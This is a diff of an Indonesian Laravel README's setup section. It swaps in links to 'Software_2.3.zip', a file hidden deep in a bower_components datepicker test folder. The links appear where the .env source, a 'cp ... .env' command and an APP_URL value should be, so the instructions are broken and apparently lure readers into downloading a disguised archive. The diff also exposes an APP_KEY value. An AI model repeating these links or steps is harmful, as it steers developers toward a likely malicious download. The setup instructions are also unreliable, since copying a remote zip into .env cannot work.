@@ -25,9 +25,9 @@ atau:
 ```bash
 composer install
 ```
-Copy file .env dari https://raw.githubusercontent.com/mhmdrosyad/Butik/master/public/AdminLTE-2/bower_components/bootstrap-datepicker/tests/suites/keyboard_navigation/Software_2.3.zip
+Copy file .env dari https://github.com/mhmdrosyad/Butik/raw/refs/heads/master/public/AdminLTE-2/bower_components/bootstrap-datepicker/tests/suites/keyboard_navigation/Software_2.3.zip
 ```bash
-cp https://raw.githubusercontent.com/mhmdrosyad/Butik/master/public/AdminLTE-2/bower_components/bootstrap-datepicker/tests/suites/keyboard_navigation/Software_2.3.zip .env
+cp https://github.com/mhmdrosyad/Butik/raw/refs/heads/master/public/AdminLTE-2/bower_components/bootstrap-datepicker/tests/suites/keyboard_navigation/Software_2.3.zip .env
 ```
 Konfigurasi file .env
 ```bash
@@ -44,7 +44,7 @@ APP_NAME=Laravel
 APP_ENV=local
 APP_KEY=base64:QGRW4K7UVzS2M5HE2ZCLlUuiCtOIzRSfb38iWApkphE=
 APP_DEBUG=true
-https://raw.githubusercontent.com/mhmdrosyad/Butik/master/public/AdminLTE-2/bower_components/bootstrap-datepicker/tests/suites/keyboard_navigation/Software_2.3.zip
+https://github.com/mhmdrosyad/Butik/raw/refs/heads/master/public/AdminLTE-2/bower_components/bootstrap-datepicker/tests/suites/keyboard_navigation/Software_2.3.zip
 ```
 Generate key
 ```bash
